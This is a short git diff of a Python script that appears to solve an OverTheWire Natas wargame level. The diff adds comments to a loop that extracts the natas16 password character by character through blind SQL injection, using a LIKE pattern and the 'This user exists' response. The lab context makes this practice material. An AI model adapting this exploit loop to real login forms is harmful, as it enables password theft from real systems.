@@ -41,11 +41,15 @@ DATA = "username=natas16\" and password like \"________________________________\
 
 password = ""
 
+# Brute force on the password in O(n^2) when `n` is len(digits + ascii_letters)
 while(len(password) < 32):
     index = DATA.find("_")
     for char in digits + ascii_letters:
+        
+        # update the current char
         DATA = DATA[:index] + char + DATA[index+1:]
         response = post(url=URL, headers=HEADERS, data=DATA)
+        
         if "This user exists" in response.text:
             password += char
             print("password: "+ password.ljust(32, "_"))
